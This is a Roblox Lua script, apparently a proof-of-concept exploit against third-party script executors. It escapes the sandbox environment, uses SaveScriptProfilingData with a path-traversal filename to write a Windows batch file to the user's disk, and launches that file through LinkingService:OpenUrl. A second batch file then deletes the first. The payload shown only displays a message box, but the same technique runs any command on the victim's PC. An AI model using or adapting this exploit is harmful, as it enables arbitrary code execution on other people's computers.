setfenv(1, getfenv(require))
getfenv().game = nil
local LinkingService = game:GetService("LinkingService")
local ScriptContext = game:GetService("ScriptContext")

local messageBoxScript = [[
@echo off
setlocal

REM Set your PC username variable
set "pcUsername=%USERNAME%"

REM Create a concise error message
set "message=Hello %pcUsername%, I exploited a vulnerability in your executor. No harm done, but be cautious!"

REM Display the error message box using PowerShell
PowerShell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('%message%', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)"

endlocal
]]

local messageBoxPayload = ScriptContext:SaveScriptProfilingData(messageBoxScript, "../../../../uacvuln.bat")
LinkingService:OpenUrl(messageBoxPayload)

local cleanupScript = [[
@echo off
timeout /t 3 > nul
del /f /q "../../../../uacvuln.bat"
]]
local cleanupPayload = ScriptContext:SaveScriptProfilingData(cleanupScript, "../../../../cleanup.bat")

LinkingService:OpenUrl(cleanupPayload)
